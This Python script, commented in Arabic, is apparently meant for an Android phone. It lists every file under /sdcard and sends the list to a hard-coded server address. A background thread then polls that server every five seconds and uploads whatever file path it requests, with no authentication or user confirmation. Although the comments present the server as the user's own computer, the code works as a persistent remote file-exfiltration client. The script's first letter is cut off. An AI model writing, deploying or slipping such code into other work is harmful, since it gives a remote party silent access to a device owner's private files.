mport socket
import os
import threading
import time

SERVER_IP = "192.168.1.5"  # ← غيّره إلى IP جهاز الخادم (الكمبيوتر)
SERVER_PORT = 12345

def list_all_files(base_path="/sdcard"):
    file_paths = []
    for root, dirs, files in os.walk(base_path):
        for name in files:
            full_path = os.path.join(root, name)
            file_paths.append(full_path)
    return file_paths

def send_file_list():
    try:
        file_list = list_all_files()
        joined = "\n".join(file_list)

        s = socket.socket()
        s.connect((SERVER_IP, SERVER_PORT))
        s.send(b"LIST")  # إعلام الخادم أنه سيرسل قائمة
        ack = s.recv(10)
        if ack == b"OK":
            s.send(joined.encode())
        s.close()
        print("📤 تم إرسال قائمة الملفات بنجاح.")
    except Exception as e:
        print("❌ فشل إرسال القائمة:", str(e))

def listen_for_requests():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, SERVER_PORT))
            s.send(b"WAIT")  # إعلام الخادم أننا ننتظر طلب تحميل
            ack = s.recv(10)
            if ack.startswith(b"REQF"):  # طلب ملف
                file_path = ack[4:].decode()
                print("📥 طلب تحميل:", file_path)
                send_file(file_path)
            s.close()
        except Exception as e:
            print("❌ خطأ في الانتظار:", str(e))
        time.sleep(5)  # إعادة المحاولة كل 5 ثوانٍ

def send_file(file_path):
    try:
        if not os.path.exists(file_path):
            print("❌ الملف غير موجود:", file_path)
            return

        s = socket.socket()
        s.connect((SERVER_IP, SERVER_PORT))
        s.send(b"FILE")
        ack = s.recv(10)
        if ack == b"OK":
            s.send(file_path.encode())
            s.recv(1024)
            with open(file_path, 'rb') as f:
                while True:
                    data = f.read(1024)
                    if not data:
                        break
                    s.send(data)
        s.close()
        print("✅ تم إرسال الملف:", file_path)
    except Exception as e:
        print("❌ فشل إرسال الملف:", str(e))

# ====== بدء التشغيل ======
# إرسال قائمة الملفات أولاً
send_file_list()

# بدء الانتظار في الخلفية
threading.Thread(target=listen_for_requests, daemon=True).start()

# إبقاء السكريبت شغالًا
while True:
    time.sleep(60)
